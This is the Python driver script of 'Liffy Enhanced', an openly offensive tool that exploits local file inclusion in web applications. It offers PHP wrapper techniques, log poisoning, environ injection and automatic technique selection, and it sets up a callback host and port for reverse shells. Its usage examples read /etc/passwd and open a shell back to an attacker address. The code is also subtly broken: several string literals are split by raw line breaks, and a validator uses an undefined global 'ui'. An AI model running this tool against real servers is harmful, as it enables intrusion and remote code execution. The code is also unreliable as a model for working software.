#!/usr/bin/env python3
"""
Liffy Enhanced - Ultimate Local File Inclusion Exploitation Tool
Enhanced version with modern Python 3 features, new techniques, and improved UI
"""

__author__ = 'rotlogix'
__author__ = 'unicornFurnace'
__version__ = '2.0.0'

import argparse
import sys
import requests
from urllib.parse import urlparse, quote_plus
import time
import core_enhanced
import datetime
import logging
import json
import os
from pathlib import Path
from typing import Optional, Dict, List, Any
import threading
import subprocess
from dataclasses import dataclass
from enum import Enum
import ip_utils

# Enhanced terminal colors and formatting
try:
    from blessings import Terminal
    t = Terminal()
except ImportError:
    # Fallback if blessings is not available
    class Terminal:
        def __getattr__(self, name):
            return lambda x: x
    t = Terminal()

class Technique(Enum):
    DATA = "data"
    INPUT = "input"
    EXPECT = "expect"
    ENVIRON = "environ"
    ACCESS = "access"
    SSH = "ssh"
    FILTER = "filter"
    ZIP = "zip"
    PHAR = "phar"
    COMPRESS = "compress"
    AUTO = "auto"

@dataclass
class LiffyConfig:
    """Configuration class for Liffy"""
    target_url: str
    technique: Technique
    lhost: Optional[str] = None
    lport: Optional[int] = None
    auto_ip: bool = False
    auto_port: bool = False
    cookies: Optional[str] = None
    location: Optional[str] = None
    nostager: bool = False
    relative: bool = False
    verbose: bool = False
    output_file: Optional[str] = None
    timeout: int = 30
    user_agent: Optional[str] = None
    proxy: Optional[str] = None
    threads: int = 1

class LiffyLogger:
    """Enhanced logging system"""
    
    def __init__(self, verbose: bool = False, output_file: Optional[str] = None):
        self.verbose = verbose
        self.logger = logging.getLogger('liffy')
        self.logger.setLevel(logging.DEBUG if verbose else logging.INFO)
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        console_handler.setFormatter(console_format)
        self.logger.addHandler(console_handler)
        
        # File handler if specified
        if output_file:
            file_handler = logging.FileHandler(output_file)
            file_handler.setLevel(logging.DEBUG)
            file_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_format)
            self.logger.addHandler(file_handler)
    
    def info(self, message: str):
        self.logger.info(message)
    
    def warning(self, message: str):
        self.logger.warning(message)
    
    def error(self, message: str):
        self.logger.error(message)
    
    def debug(self, message: str):
        self.logger.debug(message)

class LiffyUI:
    """Enhanced UI with better formatting and progress indicators"""
    
    def __init__(self, logger: LiffyLogger):
        self.logger = logger
    
    def banner(self):
        """Enhanced banner with version info"""
        banner_text = f"""
{t.cyan("""
    .____    .__  _____  _____
    |    |   |__|/ ____\/ ____\__.__.
    |    |   |  \   __\   __<   |  |
    |    |___|  ||  |   |  |  \___  |
    |_______ \__||__|   |__|  / ____| v{__version__}
        \/                \/

    Enhanced Local File Inclusion Exploitation Tool
    Author: {__author__}
    Python 3 Compatible | Modern Features | Advanced Techniques
""")}
        print(banner_text)
    
    def progress_bar(self, duration: float = 2.0, message: str = "Processing"):
        """Enhanced progress bar with message"""
        bar_width = 50
        sys.stdout.write(t.cyan(f"[{datetime.datetime.now()}] {message}: "))
        sys.stdout.write(" " * bar_width)
        sys.stdout.flush()
        sys.stdout.write("" * (bar_width + 1))
        
        for i in range(bar_width):
            time.sleep(duration / bar_width)
            sys.stdout.write("█")
            sys.stdout.flush()
        
        sys.stdout.write("
")
    
    def success(self, message: str):
        """Success message"""
        print(t.green(f"[{datetime.datetime.now()}] ✓ {message}"))
    
    def error(self, message: str):
        """Error message"""
        print(t.red(f"[{datetime.datetime.now()}] ✗ {message}"))
    
    def warning(self, message: str):
        """Warning message"""
        print(t.yellow(f"[{datetime.datetime.now()}] ⚠ {message}"))
    
    def info(self, message: str):
        """Info message"""
        print(t.cyan(f"[{datetime.datetime.now()}] ℹ {message}"))

class LiffyValidator:
    """Input validation and security checks"""
    
    @staticmethod
    def validate_url(url: str) -> bool:
        """Validate target URL"""
        try:
            parsed = urlparse(url)
            return all([parsed.scheme, parsed.netloc])
        except Exception:
            return False
    
    @staticmethod
    def validate_port(port: int) -> bool:
        """Validate port number"""
        return 1 <= port <= 65535
    
    @staticmethod
    def validate_ip(ip: str) -> bool:
        """Validate IP address"""
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except Exception:
            return False
    
    @staticmethod
    def validate_auto_detection(config: LiffyConfig) -> tuple[Optional[str], int]:
        """Validate and auto-detect lhost and lport if needed"""
        lhost = config.lhost
        lport = config.lport
        
        # Auto-detect IP if requested or not provided
        if config.auto_ip or not lhost:
            if config.auto_ip:
                ui.info("Auto-detecting IP address...")
                ui.progress_bar(1.0, "Detecting network interfaces")
            
            detected_lhost, detected_lport = ip_utils.NetworkUtils.auto_detect_lhost_lport(config.target_url)
            
            if detected_lhost:
                lhost = detected_lhost
                if config.auto_ip:
                    ui.success(f"Auto-detected IP: {lhost}")
            else:
                ui.warning("Could not auto-detect IP address")
        
        # Auto-detect port if requested or not provided
        if config.auto_port or not lport:
            if config.auto_port:
                ui.info("Auto-detecting available port...")
                ui.progress_bar(0.5, "Finding available port")
            
            detected_port = ip_utils.PortManager.find_best_port()
            lport = detected_port
            
            if config.auto_port:
                ui.success(f"Auto-detected port: {lport}")
        
        # Validate final values
        if not lhost:
            ui.error("No IP address available. Use --lhost or --auto-ip")
            return None, 0
        
        if not lport:
            ui.error("No port available. Use --lport or --auto-port")
            return None, 0
        
        if not LiffyValidator.validate_ip(lhost):
            ui.error(f"Invalid IP address: {lhost}")
            return None, 0
        
        if not LiffyValidator.validate_port(lport):
            ui.error(f"Invalid port number: {lport}")
            return None, 0
        
        return lhost, lport

class LiffyExploiter:
    """Main exploitation class with enhanced techniques"""
    
    def __init__(self, config: LiffyConfig, logger: LiffyLogger, ui: LiffyUI):
        self.config = config
        self.logger = logger
        self.ui = ui
        self.session = requests.Session()
        
        # Set up session with user agent and proxy if specified
        if config.user_agent:
            self.session.headers.update({'User-Agent': config.user_agent})
        if config.proxy:
            self.session.proxies.update({'http': config.proxy, 'https': config.proxy})
        
        self.session.timeout = config.timeout
    
    def check_target(self) -> bool:
        """Enhanced target validation"""
        self.ui.info(f"Checking target: {self.config.target_url}")
        self.ui.progress_bar(1.0, "Validating target")
        
        try:
            parsed = urlparse(self.config.target_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            
            response = self.session.get(domain, timeout=self.config.timeout)
            if response.status_code == 200:
                self.ui.success("Target is accessible")
                return True
            else:
                self.ui.warning(f"Target returned status code: {response.status_code}")
                return False
        except requests.RequestException as e:
            self.ui.error(f"Failed to connect to target: {str(e)}")
            return False
    
    def execute_technique(self):
        """Execute the selected technique"""
        technique_map = {
            Technique.DATA: self._execute_data,
            Technique.INPUT: self._execute_input,
            Technique.EXPECT: self._execute_expect,
            Technique.ENVIRON: self._execute_environ,
            Technique.ACCESS: self._execute_access,
            Technique.SSH: self._execute_ssh,
            Technique.FILTER: self._execute_filter,
            Technique.ZIP: self._execute_zip,
            Technique.PHAR: self._execute_phar,
            Technique.COMPRESS: self._execute_compress,
            Technique.AUTO: self._execute_auto
        }
        
        if self.config.technique in technique_map:
            self.ui.info(f"Executing {self.config.technique.value} technique")
            technique_map[self.config.technique]()
        else:
            self.ui.error("Invalid technique selected")
            sys.exit(1)
    
    def _execute_data(self):
        """Execute data:// technique"""
        from core_enhanced import DataEnhanced
        exploiter = DataEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_input(self):
        """Execute php://input technique"""
        from core_enhanced import InputEnhanced
        exploiter = InputEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_expect(self):
        """Execute expect:// technique"""
        from core_enhanced import ExpectEnhanced
        exploiter = ExpectEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_environ(self):
        """Execute /proc/self/environ technique"""
        from core_enhanced import EnvironEnhanced
        exploiter = EnvironEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_access(self):
        """Execute access log poisoning technique"""
        from core_enhanced import AccessLogsEnhanced
        exploiter = AccessLogsEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_ssh(self):
        """Execute SSH log poisoning technique"""
        from core_enhanced import SSHLogsEnhanced
        exploiter = SSHLogsEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_filter(self):
        """Execute php://filter technique"""
        from core_enhanced import FilterEnhanced
        exploiter = FilterEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_zip(self):
        """Execute zip:// technique (new)"""
        from core_enhanced import ZipEnhanced
        exploiter = ZipEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_phar(self):
        """Execute phar:// technique (new)"""
        from core_enhanced import PharEnhanced
        exploiter = PharEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_compress(self):
        """Execute compress.zlib:// technique (new)"""
        from core_enhanced import CompressEnhanced
        exploiter = CompressEnhanced(self.config, self.logger, self.ui)
        exploiter.execute()
    
    def _execute_auto(self):
        """Execute automatic technique detection and exploitation"""
        from core_enhanced import AutoExploit
        exploiter = AutoExploit(self.config, self.logger, self.ui)
        exploiter.execute()

def parse_arguments():
    """Enhanced argument parsing"""
    parser = argparse.ArgumentParser(
        description="Liffy Enhanced - Ultimate Local File Inclusion Exploitation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --url http://target/file.php?page= --data
  %(prog)s --url http://target/file.php?page= --filter --file /etc/passwd
  %(prog)s --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 4444
  %(prog)s --url http://target/file.php?page= --zip --payload shell.php
        """
    )
    
    # Required arguments
    parser.add_argument("--url", required=True, help="Target URL with LFI parameter")
    
    # Technique selection
    technique_group = parser.add_mutually_exclusive_group(required=True)
    technique_group.add_argument("--data", action="store_true", help="data:// technique")
    technique_group.add_argument("--input", action="store_true", help="php://input technique")
    technique_group.add_argument("--expect", action="store_true", help="expect:// technique")
    technique_group.add_argument("--environ", action="store_true", help="/proc/self/environ technique")
    technique_group.add_argument("--access", action="store_true", help="Apache access log poisoning")
    technique_group.add_argument("--ssh", action="store_true", help="SSH auth log poisoning")
    technique_group.add_argument("--filter", action="store_true", help="php://filter technique")
    technique_group.add_argument("--zip", action="store_true", help="zip:// technique (new)")
    technique_group.add_argument("--phar", action="store_true", help="phar:// technique (new)")
    technique_group.add_argument("--compress", action="store_true", help="compress.zlib:// technique (new)")
    technique_group.add_argument("--auto", action="store_true", help="Automatic technique detection")
    
    # Payload options
    parser.add_argument("--lhost", help="Callback host for reverse shells")
    parser.add_argument("--lport", type=int, help="Callback port for reverse shells")
    parser.add_argument("--auto-ip", action="store_true", help="Auto-detect IP address")
    parser.add_argument("--auto-port", action="store_true", help="Auto-detect available port")
    parser.add_argument("--nostager", action="store_true", help="Execute payload directly without stager")
    parser.add_argument("--payload", help="Custom payload file path")
    
    # Log poisoning options
    parser.add_argument("--location", help="Path to log file (access.log, auth.log, etc.)")
    parser.add_argument("--relative", action="store_true", help="Use path traversal sequences")
    
    # Request options
    parser.add_argument("--cookies", help="Session cookies")
    parser.add_argument("--user-agent", help="Custom User-Agent string")
    parser.add_argument("--proxy", help="HTTP proxy (http://proxy:port)")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds")
    
    # Output options
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--output", "-o", help="Output file for logs")
    parser.add_argument("--threads", type=int, default=1, help="Number of threads for parallel requests")
    
    # Network info options
    parser.add_argument("--show-network", action="store_true", help="Show network information and exit")
    parser.add_argument("--list-ports", action="store_true", help="List suggested ports and exit")
    
    # Filter technique specific
    parser.add_argument("--file", help="File to read (for filter technique)")
    
    return parser.parse_args()

def show_network_info():
    """Show network information"""
    print(t.cyan("
🌐 Network Information"))
    print("=" * 50)
    
    try:
        network_info = ip_utils.NetworkUtils.get_network_info()
        
        print(f"
{t.green('Local IP:')} {network_info['local_ip'] or 'Not detected'}")
        print(f"{t.green('Public IP:')} {network_info['public_ip'] or 'Not detected'}")
        print(f"{t.green('Best Local IP:')} {network_info['best_local_ip'] or 'Not detected'}")
        
        print(f"
{t.yellow('Network Interfaces:')}")
        for interface in network_info['interfaces']:
            print(f"  {t.cyan(interface['name'])} ({interface['type']}): {', '.join(interface['ips'])}")
        
        print(f"
{t.yellow('Suggested Ports:')}")
        for port in network_info['suggested_ports']:
            available = "✓" if ip_utils.PortManager.is_port_available(port) else "✗"
            print(f"  {port}: {available}")
        
        print(f"
{t.green('Best Available Port:')} {network_info['best_port']}")
        
    except Exception as e:
        print(t.red(f"Error getting network info: {str(e)}"))

def show_port_info():
    """Show port information"""
    print(t.cyan("
🔌 Port Information"))
    print("=" * 50)
    
    try:
        suggested_ports = ip_utils.PortManager.get_suggested_ports()
        best_port = ip_utils.PortManager.find_best_port()
        
        print(f"
{t.yellow('Suggested Ports:')}")
        for port in suggested_ports:
            available = "✓ Available" if ip_utils.PortManager.is_port_available(port) else "✗ In use"
            status_color = t.green if "Available" in available else t.red
            print(f"  {port}: {status_color(available)}")
        
        print(f"
{t.green('Best Available Port:')} {best_port}")
        
        # Show some common ports
        common_ports = {
            'HTTP': 80,
            'HTTPS': 443,
            'SSH': 22,
            'FTP': 21,
            'SMTP': 25,
            'DNS': 53,
            'HTTP Alt': 8080,
            'HTTPS Alt': 8443
        }
        
        print(f"
{t.yellow('Common Service Ports:')}")
        for service, port in common_ports.items():
            available = "✓ Available" if ip_utils.PortManager.is_port_available(port) else "✗ In use"
            status_color = t.green if "Available" in available else t.red
            print(f"  {service} ({port}): {status_color(available)}")
        
    except Exception as e:
        print(t.red(f"Error getting port info: {str(e)}"))

def main():
    """Main function with enhanced error handling"""
    try:
        # Parse arguments
        args = parse_arguments()
        
        # Handle special options
        if args.show_network:
            show_network_info()
            return
        
        if args.list_ports:
            show_port_info()
            return
        
        # Validate arguments
        if not LiffyValidator.validate_url(args.url):
            print(t.red("Invalid target URL provided"))
            sys.exit(1)
        
        # Determine technique
        technique_map = {
            'data': Technique.DATA,
            'input': Technique.INPUT,
            'expect': Technique.EXPECT,
            'environ': Technique.ENVIRON,
            'access': Technique.ACCESS,
            'ssh': Technique.SSH,
            'filter': Technique.FILTER,
            'zip': Technique.ZIP,
            'phar': Technique.PHAR,
            'compress': Technique.COMPRESS,
            'auto': Technique.AUTO
        }
        
        technique = None
        for arg_name, tech in technique_map.items():
            if getattr(args, arg_name, False):
                technique = tech
                break
        
        # Create configuration
        config = LiffyConfig(
            target_url=args.url,
            technique=technique,
            lhost=args.lhost,
            lport=args.lport,
            auto_ip=args.auto_ip,
            auto_port=args.auto_port,
            cookies=args.cookies,
            location=args.location,
            nostager=args.nostager,
            relative=args.relative,
            verbose=args.verbose,
            output_file=args.output,
            timeout=args.timeout,
            user_agent=args.user_agent,
            proxy=args.proxy,
            threads=args.threads
        )
        
        # Initialize components
        logger = LiffyLogger(config.verbose, config.output_file)
        ui = LiffyUI(logger)
        
        # Display banner
        ui.banner()
        
        # Auto-detect lhost and lport if needed
        lhost, lport = LiffyValidator.validate_auto_detection(config)
        if not lhost or not lport:
            sys.exit(1)
        
        # Update config with detected values
        config.lhost = lhost
        config.lport = lport
        
        # Create exploiter and execute
        exploiter = LiffyExploiter(config, logger, ui)
        
        if exploiter.check_target():
            exploiter.execute_technique()
        else:
            ui.error("Target validation failed")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print(t.red(f"
[{datetime.datetime.now()}] Keyboard interrupt received"))
        sys.exit(0)
    except Exception as e:
        print(t.red(f"
[{datetime.datetime.now()}] Unexpected error: {str(e)}"))
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
